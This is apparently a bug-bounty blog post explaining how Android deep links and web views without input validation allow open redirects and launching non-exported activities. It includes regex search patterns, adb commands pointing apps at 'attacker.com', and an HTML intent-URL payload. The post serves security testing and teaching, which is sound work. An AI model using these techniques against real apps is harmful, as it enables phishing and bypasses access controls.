---
layout: post
title: "On Deep Links and Web Views in Android APKs"
author: "BoT"
tags: "bugbounty mobile"
excerpt_separator: <!--more-->
---

Where unvalidated deep link + rendering of said link via web view = Open redirect!

<!--more-->

### What is a Deep Link?

Deep link is essentially a link that takes you directly to a specific destination within an application. In `AndroidManifest.xml`, if you were to see `intent-filter` with `action`, `category` and `data` (with a valid `android:scheme`) elements, you're seeing a deep link!

```xml
<activity android:label="Random" android:name="com.random.region.activity.MainActivity" >
    <intent-filter>
        <!-- URI format that resolves to the activity -->
        <data android:scheme="random" android:pathPattern=".*"/>
        <!-- so that intent filter can be reached from search engines -->
        <action android:name="android.intent.action.VIEW"/>
        <!-- required for intent filter to be accessible from a web browser -->
        <category android:name="android.intent.category.BROWSABLE"/>
        <!-- allows app to respond w/o need for component name -->
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```

Considering the snippet above, we can derive that:

- **URI**: `random://*`
- **Activity**: `com.random.region.activity.MainActivity`

As such, when a user clicks on URL that matches the format of the URI specified by the `intent-filter`, say `random://random.region`, they'll be taken to the `MainActivity` that handles it.

### What is Web View?

One can think of Web view as an in-app browser -- but without the full functionalities like navigation controls or address bar -- that displays web pages within the activity layout. Exported web views are reachable by other other applications living on the mobile.

To know whether a web view is exported, in `AndroidManifest.xml`, the components have to be explicitly declared with `exported=true` attribute as per the [official Android documentation](https://developer.android.com/guide/topics/manifest/activity-element).

We can further confirm that the component is exported via the `adb` command:

```bash
# To find APK name: adb shell pm list packages | grep random
# To find package name, see the top of the code file: package com.aa.bb.cc
# To find class name, see the name of the public class: public class xx extends yy
adb shell am start -n <APK_NAME>/<PACKAGE_NAME>.<CLASS_NAME>
```

If the command returns an error message that the activity class doesn't exists, the component is not exported. However do note that non-exported components may still be reachable if the `adb` command is being executed on a **rooted emulator**. This is because `exported=true` attribute simply determines if _other apps_ can have access to the APK. The APK can still send intents to itself.

## How to Identify Vulnerable Activities?

Now that we know what deep links and web view are, its easy to see how they could lead to open redirect when combined. There are a couple of different ways to spot such vulnerabilities, unfortunately for us, they almost _always_ require some form of code review.

So yes, our eyes will blind 😪

### Vector #1: Web Views that Doesn't Validate Intent Parameters

With the following regex patterns, we can find multiple activities that obtains inputs from intents and loads them into web view:

- For web views: `view.loadUrl\((.*?)\)`
- For intents: `intent.(.*?)\("url"`

As an example, consider the snippet below:

```java
// At onCreate()
Intent intent = getIntent();
if (intent != null) {
    this.mUrl = intent.getStringExtra("URL");
    this.mTitle = intent.getStringExtra("title");
    this.mIsEnableJavascript = intent.getBooleanExtra(LocalConst.INTENT_EXTRA_KEY.ENABLE_JAVASCRIPT, false);
}

// At loadUrlOnWebView()
WebView webView2 = this.webView;
webView2.loadUrl(this.mUrl + "?showheader=false");
```

Since the intent is directly obtained from `URL` parameter and pushed into a web view without any form of validation, an attacker can force the APK to launch and direct to arbitrary URLs via the following command:

```bash
# APK name: com.random.region.activity
# Package name: com.mod.random.package.ui.webview
# Class name: ExWebViewActivity
adb shell am start -n com.random.region.activity/com.mod.random.package.ui.webview.ExWebViewActivity -e URL "https://www.example.com"
```

Once again, note that this command is executed on a rooted emulator and may not be reproducible on a non-rooted environment.

### Vector #2: Insecure Deep Links (feat. Native Implementation)

Adapted from [@\_bagipro](https://twitter.com/_bagipro/status/1294972446135791616), the general methodology I follow when it comes to exploring deep links vulnerabilities are to:

1. Find out what deep link schemes the APK supports at `AndroidManifest.xml`
2. Search for said deep links hardcoded in the codebase
3. Review the code to glean contextual clues on how the links are processed by the APK and identify possible variations in format
4. Attempt to manipulate links with `adb` command and determine if it redirects according to the supplied input

Here is a rough investigation process of a fictional scenario:

- From `AndroidManifest.xml`, we know that one of the deep link scheme for the APK is `random://*`. In this example, should URLs of `random://` format be keyed from the mobile browser, the APK would launch accordingly

  ```xml
  <activity android:label="Random" android:name="com.random.region.activity.MainActivity" >
    <intent-filter>
        <data android:scheme="random" android:pathPattern=".*"/>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
  </activity>
  ```

- Workspace-wide search for `random://` reveals strings of the following convention: `random://random.region?action=<SOMETHING>&id=<SOMETHING>`

  ```java
  private void checkOpenBooking() {
      openList( ... ? "random://random.region?action=bookinglist&id=%s" : this.bookingId ));
  }
  ```

- Another workspace-wide search with regex pattern of `action=(.*?)&id=(.*?)` directed us to code snippet where we can infer that `id` parameter requires a valid URL

  ```java
  else if (lowerCase2.startsWith("action=link&id=")) {
    String substring = lowerCase2.substring(15);
    Intent intent2 = new Intent(getActivity(), SimpleWebViewActivity.class);
    intent2.putExtra("URL", substring);
    startActivity(intent2);
  }
  ```

- Code review of `SimpleWebViewActivity` shows that it is an activity class that loads given deep link into a web view. As there were no validation to ensure the user-inputted `substring` is constrained to valid URL, an attacker can exploit this via:

  ```bash
  adb shell 'am start -d "random://random.region?&action=link&id=https://example.com"'
  ```

### Chaining It Together to Launch Unexported Activity

More often than not, activities with vulnerable web views are not exported. While one might be able to prove the existence of the vulnerability with `adb` command on a rooted emulator, its impact is drastically reduced if it cannot be reproduced on non-rooted devices.

To obtain maximum impact, it is best to comb through exported components for vulnerabilities and/or leverage on insecure deep links that may allow us to pivot to non-exported components.

For instance, assuming that an attacker was successful in identifying vulnerabilities illustrated in attack vectors above, it is possible for them to host a webpage that redirects them to a protected component via intent-crafted URL.

```html
<script>
  protected_activity =
    "intent://evil#Intent;scheme=http;component=com.random.region.activity/com.random.ui.functions.userprofile.test;end";

  protected_webview =
    "intent:#Intent;component=com.random.region.activity/region.mod.wails_partner.activity.ActivityWailsWebView;S.url=https%3A%2F%2Fwww.example.com;end";

  location.href = protected_activity || protected_webview;
</script>
```

They can then force the APK to reach the webpage by piggybacking upon exported activity with vulnerable web view or via insecure deep links.

```bash
# Piggybacking upon exported activity with vulnerable web view
adb shell am start -n com.random.region.activity/com.mod.random.package.ui.webview.ExWebViewActivity -e URL "https://attacker.com"

# Leveraging on insecure deep link
adb shell 'am start -d "random://random.region?&action=link&id=https://attacker.com"'
```

With the launch of non-exported component, the attacker has essentially violated Android security design and nullified access restrictions put in place by the developers.

Pretty cool isn't it 😎

## Resources

- [Abusing Webviews to Steal Files via Email](https://carvesystems.com/news/abusing-webviews-to-steal-files-via-email/)
- [Android Secure Coding Standards - Web Views](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87150638)
- [Exploiting Android Webview Vulnerabilities](https://medium.com/mobis3c/exploiting-android-webview-vulnerabilities-e2bcff780892)
- [Exploiting Deep Links in Android](https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html)
- [How to Guard Against Mobile App Deep Link Abuse](https://www.nowsecure.com/blog/2019/04/05/how-to-guard-against-mobile-app-deep-link-abuse/)
